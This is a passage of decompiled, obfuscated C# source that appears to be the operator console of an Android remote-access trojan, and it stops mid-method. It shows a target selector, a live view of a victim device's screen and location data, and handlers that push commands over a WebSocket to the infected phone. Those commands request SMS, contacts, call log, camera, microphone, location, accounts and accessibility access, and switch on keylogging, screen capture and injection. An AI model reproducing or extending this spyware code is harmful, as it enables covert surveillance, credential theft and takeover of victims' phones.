		this.Combodats.Name = EXGuarder._752C0D08;
		this.Combodats.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.Combodats.Radius = 15;
		this.Combodats.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.Combodats.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Combodats.Size = new System.Drawing.Size(171, 25);
		this.Combodats.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Combodats.TabIndex = 42;
		this.Combodats.Text = EXGuarder._2D325B33;
		this.Combodats.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeWidth_W13.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W13.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W13.Location = new System.Drawing.Point(9, 34);
		this.DrakeWidth_W13.Name = EXGuarder._173D5E5C;
		this.DrakeWidth_W13.Size = new System.Drawing.Size(171, 22);
		this.DrakeWidth_W13.TabIndex = 45;
		this.comboTargts.Dock = System.Windows.Forms.DockStyle.Top;
		this.comboTargts.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboTargts.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comboTargts.Font = new System.Drawing.Font(EXGuarder._65142166, 9f);
		this.comboTargts.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.comboTargts.Items.AddRange(new object[5]
		{
			EXGuarder._04426670,
			EXGuarder._483F0F01,
			EXGuarder._1E306C55,
			EXGuarder._31001B01,
			EXGuarder._42684A53
		});
		this.comboTargts.Location = new System.Drawing.Point(9, 9);
		this.comboTargts.Margin = new System.Windows.Forms.Padding(4);
		this.comboTargts.MinimumSize = new System.Drawing.Size(56, 0);
		this.comboTargts.Name = EXGuarder._2F413B19;
		this.comboTargts.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboTargts.Radius = 15;
		this.comboTargts.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboTargts.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboTargts.Size = new System.Drawing.Size(171, 25);
		this.comboTargts.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboTargts.TabIndex = 0;
		this.comboTargts.Text = EXGuarder._38262E38;
		this.comboTargts.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.Gray;
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(0, 0);
		this.DrakeWidth_W2.Name = EXGuarder._0B406078;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(337, 1);
		this.DrakeWidth_W2.TabIndex = 39;
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Name = EXGuarder._3D4C6043;
		this.Panel2.Size = new System.Drawing.Size(380, 10);
		this.Panel2.TabIndex = 0;
		this.Panel26.Controls.Add(this.mainstatelabel);
		this.Panel26.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel26.Location = new System.Drawing.Point(2, 778);
		this.Panel26.Name = EXGuarder._5F5C046F;
		this.Panel26.Size = new System.Drawing.Size(860, 18);
		this.Panel26.TabIndex = 40;
		this.mainstatelabel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mainstatelabel.Font = new System.Drawing.Font(EXGuarder._65142166, 8.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.mainstatelabel.ForeColor = System.Drawing.Color.White;
		this.mainstatelabel.Location = new System.Drawing.Point(0, 0);
		this.mainstatelabel.Name = EXGuarder._03232948;
		this.mainstatelabel.Size = new System.Drawing.Size(860, 18);
		this.mainstatelabel.TabIndex = 1;
		this.mainstatelabel.Text = EXGuarder._121B0459;
		this.mainstatelabel.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.infoview.AllowExternalDrop = true;
		this.infoview.CreationProperties = null;
		this.infoview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.infoview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.infoview.Location = new System.Drawing.Point(0, 0);
		this.infoview.Name = EXGuarder._70245F15;
		this.infoview.Size = new System.Drawing.Size(860, 674);
		this.infoview.TabIndex = 27;
		this.infoview.ZoomFactor = 1.0;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(864, 798);
		base.Controls.Add(this.maintabctrl);
		base.Controls.Add(this.Panel26);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._5711250D);
		this.MinimumSize = new System.Drawing.Size(863, 580);
		base.Name = EXGuarder._4F380C44;
		this.Text = EXGuarder._1136341C;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel26, 0);
		base.Controls.SetChildIndex(this.maintabctrl, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.maintabctrl.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		this.TabPage2.ResumeLayout(false);
		this.Panel47.ResumeLayout(false);
		this.Panel41.ResumeLayout(false);
		this.Panel27.ResumeLayout(false);
		this.Panel17.ResumeLayout(false);
		this.Panel16.ResumeLayout(false);
		this.Panel15.ResumeLayout(false);
		this.Panel14.ResumeLayout(false);
		this.Panel13.ResumeLayout(false);
		this.Panel12.ResumeLayout(false);
		this.Panel11.ResumeLayout(false);
		this.Panel10.ResumeLayout(false);
		this.Panel9.ResumeLayout(false);
		this.Panel8.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		this.Panel45.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.TabPage3.ResumeLayout(false);
		this.Panel50.ResumeLayout(false);
		this.Panel49.ResumeLayout(false);
		this.Panel48.ResumeLayout(false);
		this.Panel24.ResumeLayout(false);
		this.Panel23.ResumeLayout(false);
		this.Panel22.ResumeLayout(false);
		this.Panel21.ResumeLayout(false);
		this.Panel20.ResumeLayout(false);
		this.Panel18.ResumeLayout(false);
		this.Panel46.ResumeLayout(false);
		this.TabPage4.ResumeLayout(false);
		this.Panel25.ResumeLayout(false);
		this.Panel26.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.infoview).EndInit();
		base.ResumeLayout(false);
	}

	private void translateme()
	{
		prim18.Text = BTConst.shownotystr;
		object value = BTRegistry.GetValue(EXGuarder._3B26611B, EXGuarder._780F3933);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._32010106, TextCompare: false))
		{
			maintabctrl.TabPages[0].Text = EXGuarder._71793D20;
			maintabctrl.TabPages[1].Text = EXGuarder._793E2129;
			maintabctrl.TabPages[2].Text = EXGuarder._0F490112;
			maintabctrl.TabPages[3].Text = EXGuarder._39545000;
			prim1.Text = EXGuarder._5C464F2C;
			prim2.Text = EXGuarder._5B281223;
			prim3.Text = EXGuarder._4B344A13;
			prim4.Text = EXGuarder._44486B2E;
			prim5.Text = EXGuarder._33654F5E;
			prim6.Text = EXGuarder._1B065E41;
			prim7.Text = EXGuarder._1C30526C;
			prim8.Text = EXGuarder._193A6F14;
			prim9.Text = EXGuarder._59765B00;
			prim10.Text = EXGuarder._37281F0D;
			prim11.Text = EXGuarder._0D33402D;
			prim12.Text = EXGuarder._26156463;
			prim13.Text = EXGuarder._70016C6A;
			prim14.Text = EXGuarder._28472203;
			prim15.Text = EXGuarder._2E22583C;
			prim16.Text = EXGuarder._6B1C4764;
			optn1.Text = EXGuarder._00764137;
			optn2.Text = EXGuarder._401C4A30;
			optn3.Text = EXGuarder._36672961;
			optn4.Text = EXGuarder._3D66503D;
			optn5.Text = EXGuarder._12180762;
			optn6.Text = EXGuarder._1F645E2F;
			optn7.Text = EXGuarder._706A7504;
			optn8.Text = EXGuarder._46192859;
			optn9.Text = EXGuarder._73510A14;
			srchbtn.Text = EXGuarder._3C5C585B;
			comboTargts.Text = EXGuarder._5D462766;
			Combodats.Text = EXGuarder._0E05790F;
			logactivitystext.Text = EXGuarder._4B1A111B;
			clrbtn.Text = EXGuarder._34471152;
			delbtn.Text = EXGuarder._246C5C11;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._7727724A, TextCompare: false))
		{
			maintabctrl.TabPages[0].Text = EXGuarder._40106B4E;
			maintabctrl.TabPages[1].Text = EXGuarder._6912105C;
			maintabctrl.TabPages[2].Text = EXGuarder._6B394E77;
			maintabctrl.TabPages[3].Text = EXGuarder._462C0960;
			prim1.Text = EXGuarder._2B1C0D22;
			prim2.Text = EXGuarder._21237454;
			prim3.Text = EXGuarder._13101E54;
			prim4.Text = EXGuarder._2B121C4F;
			prim5.Text = EXGuarder._2C76015D;
			prim6.Text = EXGuarder._54181410;
			prim7.Text = EXGuarder._162A1703;
			prim8.Text = EXGuarder._386A6168;
			prim9.Text = EXGuarder._1E370811;
			prim10.Text = EXGuarder._5831030F;
			prim11.Text = EXGuarder._682C632E;
			prim12.Text = EXGuarder._19022C0B;
			prim13.Text = EXGuarder._46015612;
			prim14.Text = EXGuarder._3A2E7075;
			prim15.Text = EXGuarder._035E614F;
			prim16.Text = EXGuarder._6D4C1032;
			optn1.Text = EXGuarder._00294468;
			optn2.Text = EXGuarder._06220631;
			optn3.Text = EXGuarder._5C471F01;
			optn4.Text = EXGuarder._36603F6C;
			optn5.Text = EXGuarder._6B464A38;
			optn6.Text = EXGuarder._5F092C17;
			optn7.Text = EXGuarder._52212571;
			optn8.Text = EXGuarder._6F3B5307;
			optn9.Text = EXGuarder._624B7042;
			srchbtn.Text = EXGuarder._47004E1D;
			comboTargts.Text = EXGuarder._66313B1D;
			Combodats.Text = EXGuarder._35255960;
			logactivitystext.Text = EXGuarder._19745560;
			clrbtn.Text = EXGuarder._14043122;
			delbtn.Text = EXGuarder._25394144;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._57561E3F, TextCompare: false))
		{
			maintabctrl.TabPages[0].Text = EXGuarder._765E4B1D;
			maintabctrl.TabPages[1].Text = EXGuarder._7920640E;
			maintabctrl.TabPages[2].Text = EXGuarder._5378683E;
			maintabctrl.TabPages[3].Text = EXGuarder._22793206;
			prim1.Text = EXGuarder._13402C72;
			prim2.Text = EXGuarder._121B176D;
			prim3.Text = EXGuarder._02480375;
			prim4.Text = EXGuarder._585E3278;
			prim5.Text = EXGuarder._09373359;
			prim6.Text = EXGuarder._20326D6B;
			prim7.Text = EXGuarder._14345554;
			prim8.Text = EXGuarder._4D1D2130;
			prim9.Text = EXGuarder._1230764B;
			prim10.Text = EXGuarder._6D3E6A01;
			prim11.Text = EXGuarder._4F2B695E;
			prim12.Text = EXGuarder._0C1A4A72;
			prim13.Text = EXGuarder._50260A33;
			prim14.Text = EXGuarder._0D6E5369;
			prim15.Text = EXGuarder._751C1827;
			prim16.Text = EXGuarder._77393F3C;
			optn1.Text = EXGuarder._72735950;
			optn2.Text = EXGuarder._1044321E;
			optn3.Text = EXGuarder._0A3B1C2D;
			optn4.Text = EXGuarder._36264075;
			optn5.Text = EXGuarder._0A6E7653;
			optn6.Text = EXGuarder._145F6844;
			optn7.Text = EXGuarder._5B184E67;
			optn8.Text = EXGuarder._26563B05;
			optn9.Text = EXGuarder._005A2140;
			srchbtn.Text = EXGuarder._75136A0B;
			comboTargts.Text = EXGuarder._53375427;
			Combodats.Text = EXGuarder._263A3D54;
			logactivitystext.Text = EXGuarder._3C385D0D;
			clrbtn.Text = EXGuarder._42467547;
			delbtn.Text = EXGuarder._16474330;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._5738380D, TextCompare: false))
		{
			maintabctrl.TabPages[0].Text = EXGuarder._015F0424;
			maintabctrl.TabPages[1].Text = EXGuarder._1E504435;
			maintabctrl.TabPages[2].Text = EXGuarder._102C041A;
			maintabctrl.TabPages[3].Text = EXGuarder._0968603B;
			prim1.Text = EXGuarder._0479205B;
			prim2.Text = EXGuarder._4E5D4C3F;
			prim3.Text = EXGuarder._18525167;
			prim4.Text = EXGuarder._51156256;
			prim5.Text = EXGuarder._50554337;
			prim6.Text = EXGuarder._27444865;
			prim7.Text = EXGuarder._264F6942;
			prim8.Text = EXGuarder._69794A36;
			prim9.Text = EXGuarder._09273358;
			prim10.Text = EXGuarder._2F122823;
			prim11.Text = EXGuarder._783C383A;
			prim12.Text = EXGuarder._523A0F1D;
			prim13.Text = EXGuarder._51644058;
			prim14.Text = EXGuarder._13527469;
			prim15.Text = EXGuarder._0E170D01;
			prim16.Text = EXGuarder._19451875;
			optn1.Text = EXGuarder._4576205E;
			optn2.Text = EXGuarder._01405407;
			optn3.Text = EXGuarder._6A463E3F;
			optn4.Text = EXGuarder._395A4026;
			optn5.Text = EXGuarder._5A490845;
			optn6.Text = EXGuarder._461B7432;
			optn7.Text = EXGuarder._01315D12;
			optn8.Text = EXGuarder._7269320C;
			optn9.Text = EXGuarder._18026170;
			srchbtn.Text = EXGuarder._4A2B6727;
			comboTargts.Text = EXGuarder._4D174418;
			Combodats.Text = EXGuarder._1C2E5061;
			logactivitystext.Text = EXGuarder._63030C10;
			clrbtn.Text = EXGuarder._18643F66;
			delbtn.Text = EXGuarder._743B2D6B;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._66343F63, TextCompare: false))
		{
			maintabctrl.TabPages[0].Text = EXGuarder._6C211F5C;
			maintabctrl.TabPages[1].Text = EXGuarder._30473A13;
			maintabctrl.TabPages[2].Text = EXGuarder._133A4A0D;
			maintabctrl.TabPages[3].Text = EXGuarder._6C53495C;
			prim1.Text = EXGuarder._1153433B;
			prim2.Text = EXGuarder._2B123745;
			prim3.Text = EXGuarder._5B033A59;
			prim4.Text = EXGuarder._322E3420;
			prim5.Text = EXGuarder._0021794C;
			prim6.Text = EXGuarder._4D44785C;
			prim7.Text = EXGuarder._50731408;
			prim8.Text = EXGuarder._4F2A6049;
			prim9.Text = EXGuarder._0E214B70;
			prim10.Text = EXGuarder._0A001C07;
			prim11.Text = EXGuarder._4F1B3922;
			prim12.Text = EXGuarder._0E3D5C2F;
			prim13.Text = EXGuarder._2425476F;
			prim14.Text = EXGuarder._1F5E5D16;
			prim15.Text = EXGuarder._7809663C;
			prim16.Text = EXGuarder._750E3F6A;
			optn1.Text = EXGuarder._5D670D1A;
			optn2.Text = EXGuarder._4510463D;
			optn3.Text = EXGuarder._2F082E77;
			optn4.Text = EXGuarder._7107703D;
			optn5.Text = EXGuarder._36112B39;
			optn6.Text = EXGuarder._72732C5F;
			optn7.Text = EXGuarder._260D0F6A;
			optn8.Text = EXGuarder._0F2A5041;
			optn9.Text = EXGuarder._3F611A15;
			srchbtn.Text = EXGuarder._0F56781C;
			comboTargts.Text = EXGuarder._4339253A;
			Combodats.Text = EXGuarder._0A633413;
			logactivitystext.Text = EXGuarder._661E7503;
			clrbtn.Text = EXGuarder._00401109;
			delbtn.Text = EXGuarder._102A1034;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._420D7066, TextCompare: false))
		{
			maintabctrl.TabPages[0].Text = EXGuarder._471A4B53;
			maintabctrl.TabPages[1].Text = EXGuarder._562C396C;
			maintabctrl.TabPages[2].Text = EXGuarder._18042153;
			maintabctrl.TabPages[3].Text = EXGuarder._6C53495C;
			prim1.Text = EXGuarder._4A654B4C;
			prim2.Text = EXGuarder._1A396027;
			prim3.Text = EXGuarder._6B420A67;
			prim4.Text = EXGuarder._3A571B36;
			prim5.Text = EXGuarder._2F013A41;
			prim6.Text = EXGuarder._491F2173;
			prim7.Text = EXGuarder._07222123;
			prim8.Text = EXGuarder._6D056750;
			prim9.Text = EXGuarder._4C794017;
			prim10.Text = EXGuarder._074B100C;
			prim11.Text = EXGuarder._19575F58;
			prim12.Text = EXGuarder._63560172;
			prim13.Text = EXGuarder._0A4E621F;
			prim14.Text = EXGuarder._561D643B;
			prim15.Text = EXGuarder._3D171019;
			prim16.Text = EXGuarder._5B723445;
			optn1.Text = EXGuarder._78264373;
			optn2.Text = EXGuarder._4510463D;
			optn3.Text = EXGuarder._5C363C3C;
			optn4.Text = EXGuarder._7107703D;
			optn5.Text = EXGuarder._2B4B493E;
			optn6.Text = EXGuarder._183D402C;
			optn7.Text = EXGuarder._6069742C;
			optn8.Text = EXGuarder._52160175;
			optn9.Text = EXGuarder._1B727705;
			srchbtn.Text = EXGuarder._0F56781C;
			comboTargts.Text = EXGuarder._02221461;
			Combodats.Text = EXGuarder._40360419;
			logactivitystext.Text = EXGuarder._1B4E4507;
			clrbtn.Text = EXGuarder._524D1B3F;
			delbtn.Text = EXGuarder._0414331B;
		}
	}

	public void updatestate(string str)
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			mainstatelabel.Text = str;
		}));
	}

	public void updateactivitylog(string str)
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			logactivitystext.Text = str;
		}));
	}

	public void updateinfotext(string alllines)
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] async () =>
		{
			try
			{
				await infoview.CoreWebView2.ExecuteScriptAsync($"loadDeviceInfo(`{alllines}`);");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Exception ex3 = ex2;
				Debuger.Log_e("invoke updateinfotext", codes.EXtoString(ex3));
				ProjectData.ClearProjectError();
			}
		}));
	}

	public void updateprimes(Dictionary<string, object> primsjson)
	{
		bool flag = primsjson.ContainsKey(EXGuarder._71375362) && bool.Parse(primsjson[EXGuarder._71375362].ToString());
		bool flag2 = primsjson.ContainsKey(EXGuarder._0B6E486A) && bool.Parse(primsjson[EXGuarder._0B6E486A].ToString());
		bool flag3 = primsjson.ContainsKey(EXGuarder._735E435E) && bool.Parse(primsjson[EXGuarder._735E435E].ToString());
		bool flag4 = primsjson.ContainsKey(EXGuarder._04510A15) && bool.Parse(primsjson[EXGuarder._04510A15].ToString());
		bool flag5 = primsjson.ContainsKey(EXGuarder._19774141) && bool.Parse(primsjson[EXGuarder._19774141].ToString());
		bool flag6 = primsjson.ContainsKey(EXGuarder._6D3D286A) && bool.Parse(primsjson[EXGuarder._6D3D286A].ToString());
		bool flag7 = primsjson.ContainsKey(EXGuarder._463F1B01) && bool.Parse(primsjson[EXGuarder._463F1B01].ToString());
		bool flag8 = primsjson.ContainsKey(EXGuarder._59253103) && bool.Parse(primsjson[EXGuarder._59253103].ToString());
		bool flag9 = primsjson.ContainsKey(EXGuarder._053B2254) && bool.Parse(primsjson[EXGuarder._053B2254].ToString());
		bool flag10 = primsjson.ContainsKey(EXGuarder._64567807) && bool.Parse(primsjson[EXGuarder._64567807].ToString());
		bool flag11 = primsjson.ContainsKey(EXGuarder._31043A6B) && bool.Parse(primsjson[EXGuarder._31043A6B].ToString());
		bool flag12 = primsjson.ContainsKey(EXGuarder._730A1B00) && bool.Parse(primsjson[EXGuarder._730A1B00].ToString());
		bool flag13 = primsjson.ContainsKey(EXGuarder._0E290341) && bool.Parse(primsjson[EXGuarder._0E290341].ToString());
		bool flag14 = primsjson.ContainsKey(EXGuarder._031E0957) && bool.Parse(primsjson[EXGuarder._031E0957].ToString());
		bool flag15 = primsjson.ContainsKey(EXGuarder._12337217) && bool.Parse(primsjson[EXGuarder._12337217].ToString());
		bool flag16 = primsjson.ContainsKey(EXGuarder._406E2609) && bool.Parse(primsjson[EXGuarder._406E2609].ToString());
		bool flag17 = primsjson.ContainsKey(EXGuarder._4F623E10) && bool.Parse(primsjson[EXGuarder._4F623E10].ToString());
		bool active = !primsjson.ContainsKey(EXGuarder._6C750167) || bool.Parse(primsjson[EXGuarder._6C750167].ToString());
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			holdrequests = true;
			checkaccess.Active = flag;
			checkaccess.Enabled = !flag;
			checkcontact.Active = flag2;
			checkcontact.Enabled = !flag2;
			checkreadsms.Active = flag3;
			checkreadsms.Enabled = !flag3;
			checkcalllog.Active = flag4;
			checkcalllog.Enabled = !flag4;
			checkcamera.Active = flag5;
			checkcamera.Enabled = !flag5;
			checkaccounts.Active = flag6;
			checkaccounts.Enabled = !flag6;
			checkmic.Active = flag7;
			checkmic.Enabled = !flag7;
			checkloc.Active = flag8;
			checkloc.Enabled = !flag8;
			checkcallph.Active = flag9;
			checkcallph.Enabled = !flag9;
			checkssms.Active = flag10;
			checkssms.Enabled = !flag10;
			checkwallp.Active = flag11;
			checkwallp.Enabled = !flag11;
			checkbtry.Active = flag12;
			checkbtry.Enabled = !flag12;
			checkdraw.Active = flag13;
			checkdraw.Enabled = !flag13;
			checkinstll.Active = flag14;
			checkinstll.Enabled = !flag14;
			checkwritstng.Active = flag15;
			checkwritstng.Enabled = !flag15;
			checkaccfiles.Active = flag16;
			checkaccfiles.Enabled = !flag16;
			checknotifys.Active = flag17;
			checknotifys.Enabled = !flag17;
			checkantdelete.Active = active;
			holdrequests = false;
		}));
	}

	public void loadinformations()
	{
		VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._236F3E30);
		string value = BTCommand.FormatCommand(EXGuarder._05436D12, data);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._1D557470, BTConst.wrk);
		dictionary.Add(EXGuarder._296C6C75, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	public void loadpermissions()
	{
		VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._162F2A77);
		string value = BTCommand.FormatCommand(EXGuarder._2B13111F, data);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._5D414078, BTConst.wrk);
		dictionary.Add(EXGuarder._08146837, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	public object loadoptions()
	{
		Dictionary<string, object> dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(Btcli.ReadOptions());
		string left = Conversions.ToString(dictionary.ContainsKey(EXGuarder._720F3460) ? dictionary[EXGuarder._720F3460] : EXGuarder._40220053);
		string left2 = Conversions.ToString(dictionary.ContainsKey(EXGuarder._21061F22) ? dictionary[EXGuarder._21061F22] : EXGuarder._40220053);
		string left3 = Conversions.ToString(dictionary.ContainsKey(EXGuarder._2B6D2E5D) ? dictionary[EXGuarder._2B6D2E5D] : EXGuarder._40220053);
		string left4 = Conversions.ToString(dictionary.ContainsKey(EXGuarder._49273810) ? dictionary[EXGuarder._49273810] : EXGuarder._40220053);
		string left5 = Conversions.ToString(dictionary.ContainsKey(EXGuarder._5F0A4A4C) ? dictionary[EXGuarder._5F0A4A4C] : EXGuarder._40220053);
		string left6 = Conversions.ToString(dictionary.ContainsKey(EXGuarder._213A216B) ? dictionary[EXGuarder._213A216B] : EXGuarder._40220053);
		string left7 = Conversions.ToString(dictionary.ContainsKey(EXGuarder._0F153D45) ? dictionary[EXGuarder._0F153D45] : EXGuarder._40220053);
		string left8 = Conversions.ToString(dictionary.ContainsKey(EXGuarder._71651972) ? dictionary[EXGuarder._71651972] : EXGuarder._40220053);
		string left9 = Conversions.ToString(dictionary.ContainsKey(EXGuarder._3A1C2B68) ? dictionary[EXGuarder._3A1C2B68] : EXGuarder._40220053);
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			if (Operators.CompareString(left2, "1", TextCompare: false) == 0)
			{
				checkkeys.Active = true;
			}
			if (Operators.CompareString(left3, "1", TextCompare: false) == 0)
			{
				checkRnotfy.Active = true;
			}
			if (Operators.CompareString(left, "1", TextCompare: false) == 0)
			{
				checkRactv.Active = true;
			}
			if (Operators.CompareString(left4, "1", TextCompare: false) == 0)
			{
				chkRvapps.Active = true;
			}
			if (Operators.CompareString(left5, "1", TextCompare: false) == 0)
			{
				checkRvlinks.Active = true;
			}
			if (Operators.CompareString(left6, "1", TextCompare: false) == 0)
			{
				chkLivnotify.Active = true;
			}
			if (Operators.CompareString(left7, "1", TextCompare: false) == 0)
			{
				chkscrns.Active = true;
			}
			if (Operators.CompareString(left8, "1", TextCompare: false) == 0)
			{
				Checkatoject.Active = true;
			}
			if (Operators.CompareString(left9, "1", TextCompare: false) == 0)
			{
				Checkcryptmsg.Active = true;
			}
		}));
		object result = default(object);
		return result;
	}

	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		try
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				maintabctrl.Enabled = false;
			}));
			updatestate(EXGuarder._40546711);
			loadinformations();
			Thread.Sleep(10);
			updatestate(EXGuarder._3F610A4D);
			loadpermissions();
			Thread.Sleep(10);
			updatestate(EXGuarder._21776C37);
			loadoptions();
			Thread.Sleep(10);
			updatestate(EXGuarder._10211650);
			holdrequests = false;
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				maintabctrl.Enabled = true;
			}));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private async void profile_Load(object sender, EventArgs e)
	{
		await infoview.EnsureCoreWebView2Async();
		infoview.NavigateToString(Resources.devinfo);
		infoview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		infoview.CoreWebView2.Settings.AreDevToolsEnabled = false;
		myico.Image = Btcli.wallpaper;
		myscr.Image = Btcli.screen;
		translateme();
		statetimer.Start();
		loadworker.RunWorkerAsync();
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.Profilestr + EXGuarder._39751E0F + Btcli.name + EXGuarder._39751E0F + Btcli.country;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Profilestr + EXGuarder._39751E0F + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void checkaccess_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkaccess.Enabled && !checkaccess.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._70055E6C, EXGuarder._1F4F5F2E);
			requestprime(data);
		}
	}

	private void requestprime(object data)
	{
		string value = BTCommand.FormatCommand(EXGuarder._486F274C, RuntimeHelpers.GetObjectValue(data));
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._374C436F, BTConst.wrk);
		dictionary.Add(EXGuarder._32347563, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void loadrecord(object data)
	{
		string value = BTCommand.FormatCommand(EXGuarder._161D2848, RuntimeHelpers.GetObjectValue(data));
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._74502070, BTConst.wrk);
		dictionary.Add(EXGuarder._3C09244A, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void checkcamera_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkcamera.Enabled && !checkcamera.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._165E605E, EXGuarder._3C664A70);
			requestprime(data);
		}
	}

	private void checkcontact_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkcontact.Enabled && !checkcontact.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._231F7910, EXGuarder._39360245);
			requestprime(data);
		}
	}

	private void checkcalllog_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkcalllog.Enabled && !checkcalllog.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._0605260B, EXGuarder._65636A13);
			requestprime(data);
		}
	}

	private void checkaccounts_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkaccounts.Enabled && !checkaccounts.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._68166A4C, EXGuarder._2B583607);
			requestprime(data);
		}
	}

	private void checkmic_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkmic.Enabled && !checkmic.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._325E1D76, EXGuarder._15545B0B);
			requestprime(data);
		}
	}

	private void checkloc_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkloc.Enabled && !checkloc.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._3B391A37, EXGuarder._6004145D);
			requestprime(data);
		}
	}

	private void checkssms_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkssms.Enabled && !checkssms.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._3B4C484F, EXGuarder._1A0A104A);
			requestprime(data);
		}
	}

	private void checkwallp_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkwallp.Enabled && !checkwallp.Active)
		{
